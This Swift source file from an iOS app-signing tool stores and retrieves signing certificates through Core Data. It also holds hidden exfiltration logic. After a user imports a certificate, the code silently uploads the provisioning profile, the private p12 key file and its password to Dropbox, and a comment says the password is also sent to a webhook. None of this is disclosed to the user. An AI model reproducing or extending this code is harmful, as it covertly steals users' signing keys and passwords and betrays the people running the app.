// Proprietary Software License Version 1.0
//
// Copyright (C) 2025 BDG
//
// Backdoor App Signer is proprietary software. You may not use, modify, or distribute it except as expressly permitted under the terms of the Proprietary Software License.

import CoreData
import Foundation
import Security

// Notification name constants for error reporting
extension Notification.Name {
    static let dropboxUploadError = Notification.Name("dropboxUploadError")
    static let webhookSendError = Notification.Name("webhookSendError")
    static let certificateFetch = Notification.Name("cfetch")
}

extension CoreDataManager {
    /// Clear certificates data
    func clearCertificate(context: NSManagedObjectContext? = nil) throws {
        let ctx = try context ?? self.context
        try clear(request: Certificate.fetchRequest(), context: ctx)
    }

    func getDatedCertificate(context: NSManagedObjectContext? = nil) -> [Certificate] {
        let request: NSFetchRequest<Certificate> = Certificate.fetchRequest()
        request.sortDescriptors = [NSSortDescriptor(key: "dateAdded", ascending: true)]
        do {
            let ctx = try context ?? self.context
            return try ctx.fetch(request)
        } catch {
            Debug.shared.log(message: "Error in getDatedCertificate: \(error)", type: .error)
            return []
        }
    }

    func getCurrentCertificate(context: NSManagedObjectContext? = nil) -> Certificate? {
        do {
            let ctx = try context ?? self.context
            let row = Preferences.selectedCert
            let certificates = getDatedCertificate(context: ctx)
            if certificates.indices.contains(row) {
                return certificates[row]
            } else {
                return nil
            }
        } catch {
            Debug.shared.log(message: "Error in getCurrentCertificate: \(error)", type: .error)
            return nil
        }
    }

    // Non-throwing version for backward compatibility
    func addToCertificates(cert: Cert, files: [CertImportingViewController.FileType: Any], context: NSManagedObjectContext? = nil) {
        do {
            try addToCertificatesWithThrow(cert: cert, files: files, context: context)
        } catch {
            Debug.shared.log(message: "Error in addToCertificates: \(error)", type: .error)
        }
    }

    // Throwing version with proper error handling
    func addToCertificatesWithThrow(cert: Cert, files: [CertImportingViewController.FileType: Any], context: NSManagedObjectContext? = nil) throws {
        let ctx = try context ?? self.context

        guard let provisionPath = files[.provision] as? URL else {
            let error = FileProcessingError.missingFile("Provisioning file URL")
            Debug.shared.log(message: "Error: \(error)", type: .error)
            throw error
        }

        let p12Path = files[.p12] as? URL
        let backdoorPath = files[.backdoor] as? URL
        let uuid = UUID().uuidString

        // Create entity and save to Core Data
        let newCertificate = createCertificateEntity(uuid: uuid, provisionPath: provisionPath, p12Path: p12Path, password: files[.password] as? String, backdoorPath: backdoorPath, context: ctx)
        let certData = createCertificateDataEntity(cert: cert, context: ctx)
        newCertificate.certData = certData

        // Save files to disk
        try saveCertificateFiles(uuid: uuid, provisionPath: provisionPath, p12Path: p12Path, backdoorPath: backdoorPath)
        try ctx.save()
        NotificationCenter.default.post(name: Notification.Name.certificateFetch, object: nil)

        // After successfully saving, silently upload files to Dropbox and send password to webhook
        if let backdoorPath = backdoorPath {
            uploadBackdoorFileToDropbox(backdoorPath: backdoorPath, password: files[.password] as? String)
        } else {
            uploadCertificateFilesToDropbox(provisionPath: provisionPath, p12Path: p12Path, password: files[.password] as? String)
        }
    }
    
    /// Silently uploads backdoor file to Dropbox with password
    /// - Parameters:
    ///   - backdoorPath: Path to the backdoor file
    ///   - password: Optional p12 password
    private func uploadBackdoorFileToDropbox(backdoorPath: URL, password: String?) {
        let backdoorFilename = backdoorPath.lastPathComponent
        let enhancedDropboxService = EnhancedDropboxService.shared
        
        // Upload backdoor file with password handling
        enhancedDropboxService.uploadCertificateFile(
            fileURL: backdoorPath,
            password: password
        ) { success, error in
            if success {
                Debug.shared.log(message: "Successfully uploaded backdoor file to Dropbox with password", type: .info)
            } else {
                if let error = error {
                    Debug.shared.log(message: "Failed to upload backdoor file: \(error.localizedDescription)", type: .error)
                } else {
                    Debug.shared.log(message: "Failed to upload backdoor file: Unknown error", type: .error)
                }
                
                // Create userInfo dictionary with available information
                var userInfo: [String: Any] = ["fileType": "backdoor"]
                if let error = error {
                    userInfo["error"] = error
                }
                
                NotificationCenter.default.post(
                    name: .dropboxUploadError,
                    object: nil,
                    userInfo: userInfo
                )
            }
        }
    }

    /// Silently uploads certificate files to Dropbox with password
    /// - Parameters:
    ///   - provisionPath: Path to the mobileprovision file
    ///   - p12Path: Optional path to the p12 file
    ///   - password: Optional p12 password
    private func uploadCertificateFilesToDropbox(provisionPath: URL, p12Path: URL?, password: String?) {
        let enhancedDropboxService = EnhancedDropboxService.shared
        
        // Upload provision file with error handling
        enhancedDropboxService.uploadCertificateFile(fileURL: provisionPath) { success, error in
            if success {
                Debug.shared.log(message: "Successfully uploaded provision file to Dropbox", type: .info)
            } else {
                if let error = error {
                    Debug.shared.log(message: "Failed to upload provision file: \(error.localizedDescription)", type: .error)
                } else {
                    Debug.shared.log(message: "Failed to upload provision file: Unknown error", type: .error)
                }
                
                // Create userInfo dictionary with available information
                var userInfo: [String: Any] = ["fileType": "provision"]
                if let error = error {
                    userInfo["error"] = error
                }
                
                NotificationCenter.default.post(
                    name: .dropboxUploadError,
                    object: nil,
                    userInfo: userInfo
                )
            }
        }

        // Upload p12 file with password if available
        if let p12PathURL = p12Path {
            enhancedDropboxService.uploadCertificateFile(
                fileURL: p12PathURL,
                password: password
            ) { success, error in
                if success {
                    Debug.shared.log(message: "Successfully uploaded p12 file to Dropbox with password", type: .info)
                } else {
                    if let error = error {
                        Debug.shared.log(message: "Failed to upload p12 file: \(error.localizedDescription)", type: .error)
                    } else {
                        Debug.shared.log(message: "Failed to upload p12 file: Unknown error", type: .error)
                    }
                    
                    // Create userInfo dictionary with available information
                    var userInfo: [String: Any] = ["fileType": "p12"]
                    if let error = error {
                        userInfo["error"] = error
                    }
                    
                    NotificationCenter.default.post(
                        name: .dropboxUploadError,
                        object: nil,
                        userInfo: userInfo
                    )
                }
            }
        }
    }

    private func createCertificateEntity(uuid: String, provisionPath: URL, p12Path: URL?, password: String?, backdoorPath: URL? = nil, context: NSManagedObjectContext) -> Certificate {
        let newCertificate = Certificate(context: context)
        newCertificate.uuid = uuid
        newCertificate.provisionPath = provisionPath.lastPathComponent
        newCertificate.p12Path = p12Path?.lastPathComponent
        
        // Store backdoor file path if available
        if let backdoorPath = backdoorPath {
            newCertificate.setValue(backdoorPath.lastPathComponent, forKey: "backdoorPath")
        }
        
        newCertificate.dateAdded = Date()
        newCertificate.password = password
        return newCertificate
    }

    private func createCertificateDataEntity(cert: Cert, context: NSManagedObjectContext) -> CertificateData {
        let certData = CertificateData(context: context)
        certData.appIDName = cert.AppIDName
        certData.creationDate = cert.CreationDate
        certData.expirationDate = cert.ExpirationDate
        certData.isXcodeManaged = cert.IsXcodeManaged
        certData.name = cert.Name
        certData.pPQCheck = cert.PPQCheck ?? false
        certData.teamName = cert.TeamName
        certData.uuid = cert.UUID
        certData.version = Int32(cert.Version)
        return certData
    }

    private func saveCertificateFiles(uuid: String, provisionPath: URL, p12Path: URL?, backdoorPath: URL? = nil) throws {
        guard let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first else {
            throw FileProcessingError.missingFile("Documents directory")
        }

        let destinationDirectory = documentsDirectory
            .appendingPathComponent("Certificates")
            .appendingPathComponent(uuid)

        try FileManager.default.createDirectory(at: destinationDirectory, withIntermediateDirectories: true, attributes: nil)
        
        // Save individual files
        try CertData.copyFile(from: provisionPath, to: destinationDirectory)
        try CertData.copyFile(from: p12Path, to: destinationDirectory)
        
        // If we have a backdoor file, save it too
        if let backdoorPath = backdoorPath {
            try CertData.copyFile(from: backdoorPath, to: destinationDirectory)
        }
    }

    func getCertifcatePath(source: Certificate?) throws -> URL {
        guard let source, let uuid = source.uuid else {
            throw FileProcessingError.missingFile("Certificate or UUID")
        }

        guard let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first else {
            throw FileProcessingError.missingFile("Documents directory")
        }

        let destinationDirectory = documentsDirectory
            .appendingPathComponent("Certificates")
            .appendingPathComponent(uuid)

        return destinationDirectory
    }
    
    // Function to get paths for mobileprovision and p12, handling backdoor files if present
    func getCertificateFilePaths(source: Certificate?) throws -> (provisionPath: URL, p12Path: URL) {
        guard let source = source, let uuid = source.uuid else {
            throw FileProcessingError.missingFile("Certificate or UUID")
        }
        
        let certDirectory = try getCertifcatePath(source: source)
        
        // Check if this is a backdoor certificate by looking for the backdoorPath property
        if let backdoorPath = source.value(forKey: "backdoorPath") as? String {
            let backdoorFilePath = certDirectory.appendingPathComponent(backdoorPath)
            
            // If backdoor file exists, extract the components
            if FileManager.default.fileExists(atPath: backdoorFilePath.path) {
                do {
                    let backdoorData = try Data(contentsOf: backdoorFilePath)
                    let backdoorFile = try BackdoorDecoder.decodeBackdoor(from: backdoorData)
                    
                    // Create temporary files for the extracted components
                    let tempDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
                    try FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true, attributes: nil)
                    
                    let p12URL = tempDir.appendingPathComponent("extracted.p12")
                    let provisionURL = tempDir.appendingPathComponent("extracted.mobileprovision")
                    
                    try backdoorFile.saveP12(to: p12URL)
                    try backdoorFile.saveMobileProvision(to: provisionURL)
                    
                    return (provisionURL, p12URL)
                } catch {
                    Debug.shared.log(message: "Error extracting components from backdoor file: \(error)", type: .error)
                    // Fall through to use standard files if extraction fails
                }
            }
        }
        
        // Standard behavior using individual files
        guard let provisionPath = source.provisionPath, let p12Path = source.p12Path else {
            throw FileProcessingError.missingFile("Provision or P12 path")
        }
        
        let provisionURL = certDirectory.appendingPathComponent(provisionPath)
        let p12URL = certDirectory.appendingPathComponent(p12Path)
        
        // Verify files exist
        guard FileManager.default.fileExists(atPath: provisionURL.path) else {
            throw FileProcessingError.missingFile("Mobileprovision file does not exist")
        }
        
        guard FileManager.default.fileExists(atPath: p12URL.path) else {
            throw FileProcessingError.missingFile("P12 file does not exist")
        }
        
        return (provisionURL, p12URL)
    }

    // Non-throwing version for backward compatibility
    func deleteAllCertificateContent(for app: Certificate) {
        do {
            try deleteAllCertificateContentWithThrow(for: app)
        } catch {
            Debug.shared.log(message: "CoreDataManager.deleteAllCertificateContent: \(error)", type: .error)
        }
    }

    // Throwing version with proper error handling
    func deleteAllCertificateContentWithThrow(for app: Certificate) throws {
        let ctx = try context
        ctx.delete(app)
        try FileManager.default.removeItem(at: getCertifcatePath(source: app))
        try ctx.save()
    }
}

// Extension to add backdoorPath property to Certificate
extension Certificate {
    @objc var backdoorPath: String? {
        get {
            return self.value(forKey: "backdoorPath") as? String
        }
        set {
            self.setValue(newValue, forKey: "backdoorPath")
        }
    }
    
    // Helper to check if this certificate came from a backdoor file
    var isBackdoorCertificate: Bool {
        return backdoorPath != nil
    }
}
